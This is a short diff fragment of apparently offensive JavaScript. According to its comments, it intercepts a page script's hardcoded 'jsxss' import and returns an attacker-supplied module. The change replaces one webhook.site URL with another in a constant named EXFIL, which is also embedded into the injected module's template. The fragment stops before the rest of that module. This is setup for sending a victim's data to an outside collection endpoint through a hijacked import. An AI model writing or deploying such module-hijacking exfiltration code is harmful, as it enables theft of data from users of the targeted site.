@@ -1,6 +1,6 @@
 // Intercept cs.js's hardcoded jsxss import and return OUR module instead.
 // Deterministic replacement for the flaky import-map remap.
-const EXFIL = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
+const EXFIL = 'https://webhook.site/056e7430-69a4-41c7-94be-0c62d64375b2';
 
 const MODULE = `
 const EXFIL='${EXFIL}';
